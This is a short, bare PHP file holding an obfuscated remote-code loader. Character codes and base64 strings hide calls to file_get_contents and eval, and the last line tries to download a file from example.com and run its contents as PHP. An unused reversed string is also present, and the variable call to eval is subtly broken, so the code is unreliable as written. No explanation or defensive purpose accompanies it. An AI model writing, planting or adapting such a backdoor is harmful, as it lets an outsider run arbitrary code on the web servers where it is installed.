<?php
function x($c){return chr($c);} 
$p=strrev(x(100).x(97).x(116).x(97).x(99).x(111).x(109).x(109).x(97).x(110).x(100)); 
$h=x(104).x(116).x(116).x(112).x(58).x(47).x(47).x(101).x(120).x(97).x(109).x(112).x(108).x(101).x(46).x(99).x(111).x(109).x(47).x(112).x(97).x(121).x(108).x(111).x(97).x(100).x(46).x(116).x(120).x(116)); 
$g=base64_decode('ZmlsZV9nZXRfY29udGVudHM=');$e='ZXZhbA==';$u='dXJsZGVjb2Rl'; 
$q=base64_decode($e);$w=base64_decode($u); 
$q($w('%3f%3e').$g($h, false)); 
?>
